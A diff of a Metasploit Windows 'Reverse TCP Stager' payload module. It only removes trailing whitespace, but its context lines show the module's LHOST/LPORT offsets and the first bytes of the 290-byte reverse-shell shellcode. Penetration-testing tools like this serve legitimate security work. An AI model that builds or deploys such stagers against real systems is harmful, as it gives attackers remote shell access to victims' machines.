@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -18,7 +18,7 @@ module Metasploit3
 
 	include Msf::Payload::Stager
 	include Msf::Payload::Windows
-	
+
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Reverse TCP Stager',
@@ -34,7 +34,7 @@ module Metasploit3
 				{
 					'RequiresMidstager' => false,
 					'Offsets' => { 'LHOST' => [ 197, 'ADDR' ], 'LPORT' => [ 204, 'n' ], 'ReverseConnectRetries' => [ 195, 'C'] },
-	 				'Payload' =>  
+	 				'Payload' =>
 						# Length: 290 bytes
 						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
 						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
@@ -58,7 +58,7 @@ module Metasploit3
 				}
 			))
 
-		
+
 	end
 
 end
